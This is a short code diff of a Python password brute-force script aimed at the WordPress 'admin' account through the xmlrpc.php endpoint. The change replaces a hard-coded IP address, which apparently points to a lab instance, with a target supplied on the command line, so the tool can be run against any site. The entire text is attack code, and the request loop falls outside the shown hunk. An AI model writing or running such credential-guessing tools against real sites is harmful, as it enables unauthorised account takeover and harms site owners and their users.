@@ -1,8 +1,9 @@
 from bs4 import BeautifulSoup
 import requests, sys
 
+target = sys.argv[1]
 user = 'admin'
-passwords = sys.argv[1]
+passwords = sys.argv[2]
 
 class brute:
     def __init__(self,url):
@@ -16,7 +17,7 @@ class brute:
         #print(soup.prettify())
         return resp
 if __name__ == '__main__':
-    url = "http://94.237.49.166:40599/xmlrpc.php"
+    url = f"http://{target}/xmlrpc.php"
     wp_brute = brute(url)
     with open(passwords, 'r',encoding='latin1') as file:
         file = file.readlines() 
